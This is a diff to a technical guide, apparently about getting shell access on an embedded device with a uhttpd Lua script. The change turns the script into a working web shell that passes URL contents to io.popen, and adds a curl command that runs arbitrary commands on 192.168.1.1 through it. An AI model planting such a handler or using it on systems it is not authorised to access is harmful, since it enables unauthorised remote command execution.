@@ -1504,11 +1504,19 @@ that can be packed together with the configuration is called.
 That script can look like follows:
 
 ----
+local hex_to_char = function(x)
+  return string.char(tonumber(x, 16))
+end
+
+local unescape = function(url)
+  return url:gsub("%%(%x%x)", hex_to_char)
+end
+
 function handle_request(env)
     uhttpd.send("Status: 200 OK\r\n")
     uhttpd.send("Content-Type: text/html\r\n\r\n")
 
-    local command = "echo injected command"
+    local command = unescape(string.sub(env.REQUEST_URI, 6))
 
     local proc = assert(io.popen(command))
     for line in proc:lines() do
@@ -1518,7 +1526,15 @@ function handle_request(env)
 end
 ----
 
-The +local command+ can be replaced by any shell command.
+The +local command+ is here set with the later part of the URL and can be
+replaced by any shell command.
+
+For this script, the following curl command can be used to run any command (hURL
+is a simple URL encoder - any other can be used):
+
+----
+curl -k 'https://192.168.1.1/lua/'`hURL --nocolor -s -U "ls /etc 2>&1"`
+----
 
 ==== Change U-Boot environment
 
